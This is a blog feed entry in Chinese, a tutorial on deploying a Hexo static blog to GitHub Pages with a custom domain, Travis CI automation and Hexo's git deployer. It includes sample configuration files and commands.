    <content type="html"><![CDATA[<p>关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。</p><p>这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。</p><a id="more"></a><blockquote><p>为什么使用Github Pages？</p></blockquote><p>我是出于以下原因考虑的：</p><ol><li>暂时没有服务器的需要，我只想有一个能写博客的地方。</li><li>GitHub Pages 可以提供 https服务，我不用担心域名备案的问题。</li><li>免费</li></ol><p>总之，如果你想用最简单、最省心的方式，搭建属于自己的博客，那么 Github Pages 一定不会让你失望。</p><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><ul><li>Mac OS 10.15.4</li><li>Node.js 12</li><li>Hexo-cli: 3.1</li><li>NPM: 6.9</li></ul><h3 id="创建Github-Pages"><a href="#创建Github-Pages" class="headerlink" title="创建Github Pages"></a>创建Github Pages</h3><p>Github Pages分为两类，用户或组织主页、项目主页。</p><ul><li>用户或组织主页：在新建仓库时，仓库名称应该以<code>&lt;yourusername&gt;.github.io</code>的格式去填写。<code>&lt;yourusername&gt;</code>指的是你的Github 的用户名称。</li><li>创建项目主页：在新建仓库时，名称可以任意设置，然后通过<code>Setting-&gt;Options-&gt;Github Pages</code>将 <code>Source</code>选项设置为<code>Master Branch</code>，此时这个项目就变成一个 Github Pages项目了。</li></ul><p>需要注意的是：</p><ol><li>Github Pages 只针对开源的项目是免费的，如果你不想开源，那可能就需要考虑收费的套餐了。</li><li>第一种方式不能更改 Github Pages 部署分支。</li><li>如果你有自己的域名，那么推荐使用方式二创建 Github Pages。如果你没有自己的域名，那也没有关系，可以使用Github Pages 提供的域名访问<code>http://&lt;yourusername&gt;.github.io</code>。</li></ol><h3 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h3><p>如果你是通过方式一，创建的Github Pages，那么可以跳过此部分。</p><p>在 2018 年 5 月 1 日之后，GitHub Pages 已经开始提供免费为自定义域名开启 HTTPS 的功能，并且大大简化了操作的流程，现在用户已经不再需要自己提供证书，只需要将自己的域名使用 CNAME 的方式指向自己的 GitHub Pages 域名即可。</p><p>首先需要在你的 DNS 解析里添加一条解析记录，例如我选择添加子域名<code>blog.aikang.me</code>，通过 CNAME 的方式指向我刚刚自定义的 GitHub Pages 域名 <code>0xAiKang.github.io</code>。</p><p><img src="https://i.loli.net/2020/07/04/BDX384QPIZqniJU.png" alt="DNS 域名解析"></p><p>添加完成后等待 DNS 解析的生效的同时回到项目的<code>Setting</code>界面，将刚才的子域名与 Github Pages 绑定在一起。</p><p>保存之后，我们只需要耐心等待 GitHub 生成证书并确认域名的解析是否正常。</p><p><img src="https://i.loli.net/2020/07/04/OZ2Vu8p9tXgTj7q.png" alt="等待 GitHub 生成证书并确认域名解析正常"></p><h3 id="将Hexo-部署到Github-Pages"><a href="#将Hexo-部署到Github-Pages" class="headerlink" title="将Hexo 部署到Github Pages"></a>将Hexo 部署到Github Pages</h3><p>域名解析成功之后，就可以通过我们刚才绑定的域名进行访问了，但是你会发现，现在只能看到一片空白，这是因为我们的网站还没有任何内容，所以下一步需要做的就是选择一套静态模版系统。</p><p>目前市场上有很多优秀的静态模板系统，比如：</p><ul><li>Node.js 编写的 Hexo</li><li>Go 编写的 Hugo</li><li>Python 编写的 Pelican</li><li>静态博客写作客户端 Gridea</li></ul><blockquote><p>为什么要选择Hexo？</p></blockquote><p>最初在选择博客模版系统时，并没有发现 Gridea ，事后发现这个小众的静态博客写作客户端似乎才是我真正想要的。</p><p>不过既然选择了Hexo，也是因为它的生态环境很大，可选主题非常多，并且都是开源的。</p><blockquote><p>如何将 Hexo 部署到 GitHub Pages？</p></blockquote><ol><li>将 <a href="https://github.com/marketplace/travis-ci" target="_blank" rel="noopener">Travis CI</a> 添加到你的 GitHub 账户中。</li><li>前往 GitHub 的 <a href="https://github.com/settings/installations" target="_blank" rel="noopener">Applications settings</a>，配置 Travis CI 权限，使其能够访问你的 repository。</li><li>正常情况下你会被重定向到 Travis CI 的页面。如果没有，请 <a href="https://travis-ci.com/" target="_blank" rel="noopener">手动前往</a>。</li><li>前往 GitHub 新建 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">Personal Access Token</a>，只勾选 repo 的权限并生成一个新的 Token。Token 生成后请复制并保存好。</li><li>回到 Travis CI，前往你的 repository 的设置页面，在 Environment Variables 下新建一个环境变量，Name 为 GH_TOKEN，Value 为刚才你在 GitHub 生成的 Token。确保 DISPLAY VALUE IN BUILD LOG 保持 不被勾选 避免你的 Token 泄漏。点击 Add 保存。</li><li>在你的 Hexo 站点文件夹中新建一个 <code>.travis.yml</code> 文件：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo: false</span><br><span class="line">language: node_js</span><br><span class="line">node_js:</span><br><span class="line">  - 10 # use nodejs v10 LTS</span><br><span class="line">cache: npm</span><br><span class="line">branches:</span><br><span class="line">  only:</span><br><span class="line">    - master # build master branch only</span><br><span class="line">script:</span><br><span class="line">  - hexo generate # generate static files</span><br><span class="line">deploy:</span><br><span class="line">  provider: pages</span><br><span class="line">  skip-cleanup: true</span><br><span class="line">  github-token: $GH_TOKEN</span><br><span class="line">  keep-history: true</span><br><span class="line">  on:</span><br><span class="line">    branch: master</span><br><span class="line">  local-dir: public</span><br></pre></td></tr></table></figure><p>上面这个配置文件的作用是用来自动构建，编译测试。</p><p>将 <code>.travis.yml</code> 推送到 repository 中。Travis CI 会自动开始运行，并将生成的文件推送到同一 repository 下的 <code>gh-pages</code> 分支下。</p><h4 id="修改发布源"><a href="#修改发布源" class="headerlink" title="修改发布源"></a>修改发布源</h4><p>推送完成之后，会发现多了一个 <code>gh-gages</code>分支，这个分支就是用于部署站点的分支，但是GitHub Pages 会默认使用<code>master</code>分支作为发布源，所以我们需要切换发布源。</p><p>在<code>Setting-&gt;Option-&gt;GitHub Pages</code>下，使用 Source（源）下拉菜单选择发布源。</p><p><img src="https://i.loli.net/2020/07/04/AHldtP2bIhaqr8c.png" alt="修改默认源"></p><p>注意：使用用户或组织主页构建的 Github Pages 不能修改发布源，只能使用默认的 <code>master</code>分支。</p><h3 id="一键部署"><a href="#一键部署" class="headerlink" title="一键部署"></a>一键部署</h3><p>Hexo 提供了快速方便的一键部署功能，让你只需一条命令就能将网站部署到服务器上。</p><p>在正式部署之前，我们需要先修改<code>_config.yml</code> 文件，配置参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https:&#x2F;&#x2F;bitbucket.org&#x2F;JohnSmith&#x2F;johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch]</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th><th>默认值</th></tr></thead><tbody><tr><td>type</td><td>deployer</td><td>-</td></tr><tr><td>repo</td><td>项目地址</td><td>-</td></tr><tr><td>branch</td><td>分支名称</td><td>gh-pages</td></tr></tbody></table><p>有以下两点需要注意：<br>1.repo 需要选择SSH 协议，HTTPS协议会报错。<br>2.branch 选择Github Pages中设置的那个分支，而不是拉取这个项目的分支</p><p>我这里使用的是<code>git</code> 作为 deployer，所以需要手动安装一个插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>生成站点文件并部署至远程库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo deploy --generate</span><br></pre></td></tr></table></figure><p>至此，就完成了使用Github Pages 部署 Hexo 个人博客的全部过程，总的来说还是很顺利的。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://sspai.com/post/54608" target="_blank" rel="noopener">Github Pages 搭建教程</a></li><li><a href="https://hexo.io/zh-cn/docs/github-pages.html" target="_blank" rel="noopener">将Hexo 部署到 GitHub Pages</a></li><li><a href="https://hexo.io/zh-cn/docs/one-command-deployment.html" target="_blank" rel="noopener">Hexo 一键部署</a></li><li><a href="https://juejin.im/post/5acf02086fb9a028b92d8652#heading-15" target="_blank" rel="noopener">Github Pages部署个人博客（Hexo篇）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于个人博客，在很久之前就想自己搭建一套，甚至还为此买了一台服务器，但奈何自己太忙了(tai lan le) =_=，这件事情就一直搁浅了，服务器大部分时间也都是空闲状态。&lt;/p&gt;
&lt;p&gt;这段时间，突然很想把这件事情做好，觉得不能在这么拖下去了，所以便有了这篇文章。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    <category term="GitHub" scheme="https://www.0x2beace.com/categories/Tutorial/GitHub/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
  </entry>
  
</feed>
